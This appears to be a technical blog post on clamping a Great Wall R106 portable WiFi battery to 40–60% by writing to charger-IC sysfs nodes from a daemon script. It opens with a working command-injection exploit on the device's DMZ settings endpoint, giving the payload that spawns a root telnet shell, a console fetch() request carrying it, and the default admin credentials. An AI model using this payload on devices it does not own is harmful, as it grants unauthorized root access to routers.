---
publishDate: 2026-10-06
draft: false
featured: true
title: "Great Wall R106 Portable WiFi Charge Limiting Solution"
excerpt: "Gain a root shell via command injection, locate the two control layers (software vote + hardware enable) of the SGM4154X charger IC, and clamp the battery to 40%–60% with a daemon script — solving the swelling problem of portable WiFi devices kept permanently plugged in."
tags: ['embedded', 'charging', 'sysfs', 'r106', 'portable-wifi']
categories: ['embedded', 'hardware']
---

> Device: Great Wall R106 5G Portable WiFi (UNISOC UDX710 platform, SGM4154X charger IC)
>
> Goal: Keep battery between 40%–60% while permanently plugged in, preventing swelling caused by prolonged high state of charge.

---

## Table of Contents

1. [Background & Principle](#1-background--principle)
2. [Overall Approach](#2-overall-approach)
3. [Step 1: Gain Shell Access](#3-step-1-gain-shell-access)
4. [Step 2: Locate Charge Control Nodes](#4-step-2-locate-charge-control-nodes)
5. [Step 3: The Pitfall of Software-Level Stop](#5-step-3-the-pitfall-of-software-level-stop)
6. [Step 4: Hardware-Level Charge Disable](#6-step-4-hardware-level-charge-disable)
7. [Step 5: Automatic Control Script](#7-step-5-automatic-control-script)
8. [Step 6: Auto-Start on Boot](#8-step-6-auto-start-on-boot)
9. [Step 7: Verify & Close Telnet](#9-step-7-verify--close-telnet)
10. [Maintenance & Tuning](#10-maintenance--tuning)
11. [Troubleshooting](#11-troubleshooting)
12. [Appendix: APK Reverse Engineering Notes](#12-appendix-apk-reverse-engineering-notes)

---

## 1. Background & Principle

When a Li-ion battery stays at 100% SOC under high temperature, cathode oxidation and electrolyte decomposition accelerate, producing gas that causes swelling. The optimal storage band is **40%–60% SOC** (≈3.7V–3.9V open-circuit voltage). Some tablets/phones offer a built-in "battery protection mode" (e.g. capped at 40%–69%), but most portable WiFi devices lack this feature and simply charge to 100%.

Core principle: on Linux, the charger IC exposes control interfaces via **sysfs** nodes. A daemon script periodically reads battery capacity, disables the charger IC enable bit at the upper limit, and re-enables it at the lower limit — clamping the battery to the target band.

---

## 2. Overall Approach

```
┌──────────────────────────────────────────────────────────────┐
│ DMZ field command injection in stock firmware                │
│                          ↓                                    │
│ Inject telnetd to obtain root shell                          │
│                          ↓                                    │
│ Inspect power_supply sysfs + at_server binary                │
│                          ↓                                    │
│ Find two control layers:                                     │
│   ① charger-manager/stop_charge  (software vote)             │
│   ② sgm4154x-charger/charge_enabled  (HW enable)             │
│                          ↓                                    │
│ Daemon: stop at ≥60%, resume at ≤40%                         │
│                          ↓                                    │
│ Append to /etc/init.d/hostname.sh for persistence            │
└──────────────────────────────────────────────────────────────┘
```

**Key lesson**: Writing only the software node `stop_charge` shows `Not charging` in the UI while ~480 mA still flows — the SGM4154X keeps charging per its own hardware logic. **The charger IC's hardware enable bit `charge_enabled` must also be cleared to truly cut the charging path.**

---

## 3. Step 1: Gain Shell Access

### 3.1 Vulnerability

The stock web admin's DMZ endpoint `/action/router_set_dmz_params` passes `rt_dmz_ip` unsanitized into a shell command — classic command injection.

### 3.2 Procedure

1. Connect to the device WiFi and log into the stock admin (`http://192.168.1.1`; default username and password are both `admin`).

2. Navigate to **Security → DMZ**.

3. Enter the payload in the DMZ IP field and click Apply:

   ```
   ;telnetd -l/bin/sh;
   ```

4. Wait 2–3 s, restore a normal DMZ IP (e.g. `192.168.1.100`) and Apply again.

5. Enable/launch the telnet client on Windows:

   ```powershell
   dism /online /Enable-Feature /FeatureName:TelnetClient
   telnet 192.168.1.1
   ```

6. A `sh-4.4#` prompt means root shell access.

> telnetd is temporary — it disappears after reboot; re-inject when needed.

### 3.3 Headless Alternative

If the DMZ menu is hidden, open F12 Console on any authenticated admin page:

```javascript
fetch('/action/router_set_dmz_params', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({rt_dmz_switch: 'enable', rt_dmz_ip: ';telnetd -l/bin/sh;'})
}).then(r => r.text()).then(console.log)
```

> Raw PowerShell POST fails: login passwords are encoded by `password_encode()` (secret + timestamp); unauthenticated requests get the login redirect page.

---

## 4. Step 2: Locate Charge Control Nodes

### 4.1 Enumerate power supplies

```sh
# ls /sys/class/power_supply/
ac  battery  sc27xx-fgu  sgm4154x-charger  usb  wireless
```

| Node | Meaning |
|---|---|
| `battery` | SPRD charger-manager battery info |
| `sgm4154x-charger` | SGMicro SGM4154X charger IC |
| `sc27xx-fgu` | SPRD fuel gauge |

Read key values:

```sh
cat /sys/class/power_supply/battery/capacity      # capacity %  → 100
cat /sys/class/power_supply/battery/status        # status      → Full
```

### 4.2 Reverse-lookup from installed backend

A third-party backend (installed by a community APK into `/home/root/r106/`) exposes a "stop charging" toggle. Running `strings` on its server reveals the exact commands:

```sh
# ls /home/root/r106/
at_server  html  start.sh

# strings /home/root/r106/at_server | grep -i charg
disable_charge
echo 1 >/sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
echo 0 >/sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
```

Web-side call chain (corroboration):

```js
// /home/root/r106/html/js/settings.js
function disable_charge(){
    var disable_charge = $('#disable_charge').is(":checked") ? 1 : 0;
    $.get({url: "/api/batw?disable_charge="+disable_charge, ...});
}
```

> In BusyBox, use `head -n 30` — `head -30` is rejected.

---

## 5. Step 3: The Pitfall of Software-Level Stop

Initially only the charger-manager vote node was used:

```sh
echo 1 > /sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
```

Observed result:

- `battery/status` changed to `Not charging` (UI also shows stopped) ✓
- Yet the "current charging current" still showed **480 mA** ✗

**Cause**: `stop_charge` is just one software vote in the Linux charger-manager framework. With USB attached and battery voltage below the IC threshold, the SGM4154X keeps pumping current per its own hardware state machine; the software flag cannot open the physical charging path. Some charger ICs force-charge under undervoltage and cannot be blocked at all.

---

## 6. Step 4: Hardware-Level Charge Disable

Enumerate the charger IC nodes:

```sh
# ls /sys/class/power_supply/sgm4154x-charger/
capacity   charge_enabled   charge_type   constant_charge_current
constant_charge_voltage_max   health   input_current_limit
manufacturer   model_name   online   present   status   usb_type ...
```

Toggle the IC enable bit directly:

```sh
echo 0 > /sys/class/power_supply/sgm4154x-charger/charge_enabled
```

After 2–3 minutes the current dropped from 480 mA to ≈ **0 mA** — hardware disable confirmed.

| Layer | Node | Stop | Resume | Role |
|---|---|---|---|---|
| Software | `.../charger-manager/.../charger.0/stop_charge` | `echo 1` | `echo 0` | Policy vote, syncs web UI |
| Hardware | `sgm4154x-charger/charge_enabled` | `echo 0` | `echo 1` | IC enable, physically cuts current |

Drive both layers: correct UI state plus a physically open charging path.

---

## 7. Step 5: Automatic Control Script

### 7.1 Design Notes

- **Hysteresis**: upper 60%, lower 40%, prevents chattering around a single threshold.
- Poll every 60 s — negligible overhead.
- Validate numeric input to survive empty/garbage reads.
- Keep the script ASCII-only — multibyte paste over telnet corrupts lines (encountered in practice).

### 7.2 Deploy

Remount rootfs writable and create the script via heredoc:

```sh
mount -rw -o remount /

cat > /home/root/charge_limit.sh <<'EOF'
#!/bin/sh
UP=60
LOW=40
NODE1=/sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
NODE2=/sys/class/power_supply/sgm4154x-charger/charge_enabled
CAP=/sys/class/power_supply/battery/capacity
while true; do
  c=$(cat $CAP 2>/dev/null)
  case "$c" in
    ''|*[!0-9]*) ;;
    *)
      if [ "$c" -ge $UP ]; then
        echo 1 > $NODE1
        echo 0 > $NODE2
      fi
      if [ "$c" -le $LOW ]; then
        echo 0 > $NODE1
        echo 1 > $NODE2
      fi
      ;;
  esac
  sleep 60
done
EOF

chmod +x /home/root/charge_limit.sh
```

Start in background:

```sh
/home/root/charge_limit.sh &
```

### 7.3 State Transitions

```
                         capacity ≥ 60%
          ┌──────────────────────────────────┐
          │                                  ▼
   [ CHARGING ]                        [ STOPPED ]
   stop_charge=0                        stop_charge=1
   charge_enabled=1                     charge_enabled=0
          ▲                                  │
          └──────────────────────────────────┘
                         capacity ≤ 40%
```

---

## 8. Step 6: Auto-Start on Boot

The firmware uses SysV init; the third-party backend itself persists via an appended line in `/etc/init.d/hostname.sh`. Use the same hook:

```sh
echo '/home/root/charge_limit.sh &' >> /etc/init.d/hostname.sh
cat /etc/init.d/hostname.sh
```

The file tail should contain:

```sh
/home/root/r106/start.sh &
/home/root/charge_limit.sh &
```

---

## 9. Step 7: Verify & Close Telnet

### 9.1 Functional verification

```sh
cat /sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
# expect: 1

cat /sys/class/power_supply/sgm4154x-charger/charge_enabled
# expect: 0

cat /sys/class/power_supply/battery/status
# expect: Not charging
```

Verify persistence across reboot:

```sh
reboot
# Wait 1–2 min, re-telnet; status should still be Not charging
```

Over 1–2 days, watch the battery page: current → 0 at 60%, charging resumes at 40%.

### 9.2 Close temporary telnetd

```sh
killall telnetd
exit
```

Confirm from Windows:

```powershell
Test-NetConnection -ComputerName 192.168.1.1 -Port 23
# TcpTestSucceeded : False
```

Or simply reboot (telnetd is non-persistent).

### 9.3 Security cleanup

- Change the stock admin password (defaults are `admin` / `admin`).
- Use the injection only on your own device; it is a firmware vulnerability — never expose the admin interface to the internet.

---

## 10. Maintenance & Tuning

### Change thresholds

```sh
vi /home/root/charge_limit.sh        # or overwrite with cat >
# edit UP=xx LOW=yy
killall charge_limit.sh
/home/root/charge_limit.sh &
```

Recommended bands:

| Scenario | Band |
|---|---|
| Nearly always tethered | 40–60% |
| Occasional short battery use | 45–70% |
| Long-term storage (before power-off) | 40–50% |

### Fallback: clamp charge voltage

If a charger IC lacks a usable hard-disable and force-charges under undervoltage, cap the constant-voltage target so the cell never reaches the high-voltage region (SGM4154X node, units µV; `cat` the original value first):

```sh
cat /sys/class/power_supply/sgm4154x-charger/constant_charge_voltage_max
echo 4000000 > /sys/class/power_supply/sgm4154x-charger/constant_charge_voltage_max  # 4.00V
```

Approximate voltage ↔ SOC:

| Voltage | ≈SOC |
|---|---|
| 4.20 V | 100% |
| 4.10 V | ~80% |
| 4.00 V | ~60–70% |
| 3.92 V | ~50% |
| 3.80 V | ~30–40% |

---

## 11. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| PowerShell POST DMZ returns HTML login page | Not authenticated (pw is encoded) | Use authenticated browser console |
| Port 23 closed | telnetd gone after reboot or injection not executed | Re-inject via DMZ |
| `head -30` error | BusyBox syntax | Use `head -n 30` |
| script syntax errors | multibyte comments mangled over telnet | Rewrite ASCII-only |
| UI says stopped, current still flows | software-only stop | Add `echo 0 > sgm4154x-charger/charge_enabled` |
| Script gone after reboot | rootfs non-persistent or no autostart | Confirm `mount -rw -o remount /`, check hostname.sh tail |
| No /home/root/r106 | Backend not installed | Use `find / -name start.sh` or sysfs nodes directly; not required |

---

## 12. Appendix: APK Reverse Engineering Notes

The community flasher APK is Go (gomobile), package `r106/dmz`. Key strings from `libgojni.so`:

```
/action/router_set_dmz_params
{"rt_dmz_switch":"enable","rt_dmz_ip":"%s"}
;telnetd -l/bin/sh;
/action/get_mgdb_params
192.168.1.1   admin
```

Workflow:

1. Login to stock admin (default `admin` / `admin`).
2. Inject telnetd via DMZ API.
3. Restore DMZ IP.
4. After telnet: block cloud-control domains in /etc/hosts, remount rootfs, download/extract `r106.tar.gz`, append autostart line.

Platform:

```
unisoc-initgc-distro udx710-module-marlin3e  (UNISOC/Spreadtrum UDX710)
BusyBox v1.27.2, ash (sh-4.4)
Charger IC: SGMicro SGM4154X
Fuel gauge: SPRD SC27XX FGU
```

---

## Final Result

- Battery clamped to **40%–60%**, no more permanent 100% operation.
- Dual-layer control keeps UI and real current consistent.
- Auto-starts, maintenance-free; telnet only opened temporarily for debugging.
